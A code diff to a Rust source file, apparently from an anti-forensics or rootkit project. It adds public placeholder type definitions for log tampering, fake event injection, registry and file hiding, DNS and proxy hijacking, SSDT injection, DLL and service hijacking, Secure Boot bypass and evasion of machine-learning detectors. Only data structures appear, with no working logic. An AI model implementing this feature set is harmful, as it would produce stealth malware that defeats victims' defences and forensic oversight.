@@ -94,6 +94,8 @@ struct CustomLogManager {
     log_parsers: HashMap<String, LogParser>,
 }
 
+
+
 /// Registry key information
 struct RegistryKey {
     hive: RegistryHive,
@@ -239,10 +241,11 @@ struct BrowserArtifactCleaner {
 }
 
 /// Event filter
-struct EventFilter {
-    event_id: u32,
-    source: String,
-    action: FilterAction,
+#[derive(Debug, Clone)]
+pub struct EventFilter {
+    pub event_id: u32,
+    pub source: String,
+    pub action: FilterAction,
 }
 
 /// Log injection
@@ -263,10 +266,11 @@ pub enum SyslogFacility {
 }
 
 /// Message filter
-struct MessageFilter {
-    pattern: String,
-    action: FilterAction,
-    replacement: Option<String>,
+#[derive(Debug, Clone)]
+pub struct MessageFilter {
+    pub pattern: String,
+    pub action: FilterAction,
+    pub replacement: Option<String>,
 }
 
 /// Log rotation
@@ -277,18 +281,20 @@ pub struct LogRotation {
 }
 
 /// Content filter
-struct ContentFilter {
-    pattern: String,
-    replacement: String,
-    case_sensitive: bool,
+#[derive(Debug, Clone)]
+pub struct ContentFilter {
+    pub pattern: String,
+    pub replacement: String,
+    pub case_sensitive: bool,
 }
 
 /// Custom log
-struct CustomLog {
-    name: String,
-    path: PathBuf,
-    format: LogFormat,
-    parser: String,
+#[derive(Debug, Clone)]
+pub struct CustomLog {
+    pub name: String,
+    pub path: PathBuf,
+    pub format: LogFormat,
+    pub parser: String,
 }
 
 /// Log parser
@@ -316,17 +322,19 @@ struct RegistryValue {
 }
 
 /// Value filter
+#[derive(Debug, Clone)]
 pub struct ValueFilter {
-    key_pattern: String,
-    value_pattern: String,
-    action: FilterAction,
+    pub key_pattern: String,
+    pub value_pattern: String,
+    pub action: FilterAction,
 }
 
 /// Value encryption
+#[derive(Debug, Clone)]
 pub struct ValueEncryption {
-    algorithm: String,
-    key: Vec<u8>,
-    encrypted_values: HashMap<String, Vec<u8>>,
+    pub algorithm: String,
+    pub key: Vec<u8>,
+    pub encrypted_values: HashMap<String, Vec<u8>>,
 }
 
 /// Virtual key
@@ -360,9 +368,10 @@ enum HidingMethod {
 }
 
 /// File attribute manager
+#[derive(Debug, Clone)]
 pub struct FileAttributeManager {
-    attribute_masks: HashMap<PathBuf, u32>,
-    system_files: Vec<PathBuf>,
+    pub attribute_masks: HashMap<PathBuf, u32>,
+    pub system_files: Vec<PathBuf>,
 }
 
 /// Junction point
@@ -388,15 +397,17 @@ struct DataStream {
 }
 
 /// Stream encryption
+#[derive(Debug, Clone)]
 pub struct StreamEncryption {
-    algorithm: String,
-    keys: HashMap<String, Vec<u8>>,
+    pub algorithm: String,
+    pub keys: HashMap<String, Vec<u8>>,
 }
 
 /// Stream compression
+#[derive(Debug, Clone)]
 pub struct StreamCompression {
-    algorithm: CompressionAlgorithm,
-    level: u8,
+    pub algorithm: CompressionAlgorithm,
+    pub level: u8,
 }
 
 /// Timestamp rule
@@ -414,9 +425,10 @@ struct TimeZoneInfo {
 }
 
 /// Clock skew
+#[derive(Debug, Clone)]
 pub struct ClockSkew {
-    skew_amount: i64,
-    random_variance: i64,
+    pub skew_amount: i64,
+    pub random_variance: i64,
 }
 
 /// Deletion pattern
@@ -575,7 +587,8 @@ struct CleaningProfile {
 }
 
 /// Filter action
-enum FilterAction {
+#[derive(Debug, Clone)]
+pub enum FilterAction {
     Block,
     Modify,
     Redirect,
@@ -583,26 +596,319 @@ enum FilterAction {
 }
 
 /// Fake event
-struct FakeEvent {
-    event_id: u32,
-    source: String,
-    message: String,
-    timestamp: SystemTime,
+#[derive(Debug, Clone)]
+pub struct FakeEvent {
+    pub event_id: u32,
+    pub source: String,
+    pub message: String,
+    pub timestamp: SystemTime,
 }
 
 /// Injection timing
-enum InjectionTiming {
+#[derive(Debug, Clone)]
+pub enum InjectionTiming {
     Immediate,
     Delayed(u64),
     Random,
 }
 
 /// Log format
-enum LogFormat {
+#[derive(Debug, Clone)]
+pub enum LogFormat {
     Text,
     Json,
     Xml,
     Binary,
+}
+
+
+
+// ============================================================================
+// ADDITIONAL MISSING TYPES - PLACEHOLDER IMPLEMENTATIONS
+// ============================================================================
+
+
+
+#[derive(Debug, Clone)]
+pub struct DnsHijacking {
+    pub enabled: bool,
+    pub target_domains: Vec<String>,
+    pub redirect_ip: String,
+}
+
+#[derive(Debug, Clone)]
+pub struct HostsFileManipulation {
+    pub enabled: bool,
+    pub entries: HashMap<String, String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ProxyManipulation {
+    pub enabled: bool,
+    pub proxy_settings: ProxySettings,
+}
+
+#[derive(Debug, Clone)]
+pub struct ProxySettings {
+    pub http_proxy: Option<String>,
+    pub https_proxy: Option<String>,
+    pub socks_proxy: Option<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct DnsCacheManipulation {
+    pub enabled: bool,
+    pub cache_entries: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct PacFileManipulation {
+    pub enabled: bool,
+    pub pac_url: String,
+}
+
+#[derive(Debug, Clone)]
+pub struct TransparentProxy {
+    pub enabled: bool,
+    pub port: u16,
+}
+
+#[derive(Debug, Clone)]
+pub struct WinsockHijacking {
+    pub enabled: bool,
+    pub target_functions: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct SocketInterception {
+    pub enabled: bool,
+    pub intercepted_ports: Vec<u16>,
+}
+
+#[derive(Debug, Clone)]
+pub struct LspChain {
+    pub enabled: bool,
+    pub providers: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ProtocolDatabase {
+    pub protocols: HashMap<String, u16>,
+}
+
+
+
+#[derive(Debug, Clone)]
+pub struct TimeDistortion {
+    pub distortion_rate: f64,
+    pub max_distortion: i64,
+}
+
+#[derive(Debug, Clone)]
+pub struct RhythmManipulation {
+    pub enabled: bool,
+    pub rhythm_patterns: Vec<String>,
+}
+
+
+
+#[derive(Debug, Clone)]
+pub struct SecureBootBypass {
+    pub enabled: bool,
+    pub bypass_methods: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct SsdtInjection {
+    pub enabled: bool,
+    pub injected_functions: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct DllHijacking {
+    pub enabled: bool,
+    pub target_dlls: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ServiceHijacking {
+    pub enabled: bool,
+    pub target_services: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct FileAssociationHijacking {
+    pub enabled: bool,
+    pub associations: HashMap<String, String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct SearchOrderManipulation {
+    pub enabled: bool,
+    pub search_paths: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct SystemFileReplacement {
+    pub enabled: bool,
+    pub target_files: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ValueHijacking {
+    pub enabled: bool,
+    pub target_values: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct HandlerRedirection {
+    pub enabled: bool,
+    pub redirections: HashMap<String, String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct HandlerTable {
+    pub handlers: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct InterfaceManipulation {
+    pub enabled: bool,
+    pub target_interfaces: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct IntegrityBypass {
+    pub enabled: bool,
+    pub bypass_methods: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ExecutionFlow {
+    pub enabled: bool,
+    pub flow_patterns: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct PayloadInjection {
+    pub enabled: bool,
+    pub injection_methods: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct DependencyManipulation {
+    pub enabled: bool,
+    pub dependencies: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct PartitionTable {
+    pub partitions: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct PciEnumeration {
+    pub enabled: bool,
+    pub devices: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ShadowRamUsage {
+    pub enabled: bool,
+    pub usage_patterns: Vec<String>,
+}
+
+// Machine Learning Evasion Types
+#[derive(Debug, Clone)]
+pub struct EvasionSample {
+    pub data: Vec<f32>,
+    pub label: u32,
+}
+
+#[derive(Debug, Clone)]
+pub struct GradientMasking {
+    pub enabled: bool,
+    pub masking_rate: f32,
+}
+
+#[derive(Debug, Clone)]
+pub struct NoiseParameters {
+    pub noise_level: f32,
+    pub distribution: String,
+}
+
+#[derive(Debug, Clone)]
+pub struct PatternLibrary {
+    pub patterns: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct SyntheticDataGenerator {
+    pub enabled: bool,
+    pub generation_rules: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct LabelManipulation {
+    pub enabled: bool,
+    pub manipulation_rules: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ConstraintSatisfaction {
+    pub constraints: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ConstraintRelaxation {
+    pub relaxation_rate: f32,
+}
+
+#[derive(Debug, Clone)]
+pub struct OptimizationInterference {
+    pub enabled: bool,
+    pub interference_methods: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct ConvergenceDisruption {
+    pub enabled: bool,
+    pub disruption_rate: f32,
+}
+
+#[derive(Debug, Clone)]
+pub struct MagnitudeControl {
+    pub max_magnitude: f32,
+    pub min_magnitude: f32,
+}
+
+#[derive(Debug, Clone)]
+pub struct PerceptualConstraints {
+    pub constraints: Vec<String>,
+}
+
+#[derive(Debug, Clone)]
+pub struct QualityMetrics {
+    pub metrics: HashMap<String, f32>,
+}
+
+#[derive(Debug, Clone)]
+pub struct RealismMetrics {
+    pub realism_score: f32,
+    pub validation_methods: Vec<String>,
+}
+
+
+
+#[derive(Debug, Clone)]
+pub struct IndependenceMetrics {
+    pub metrics: Vec<f32>,
+}
+
+#[derive(Debug, Clone)]
+pub struct SeedManagement {
+    pub seeds: Vec<u64>,
+    pub rotation_enabled: bool,
 }
 
 /// Value type
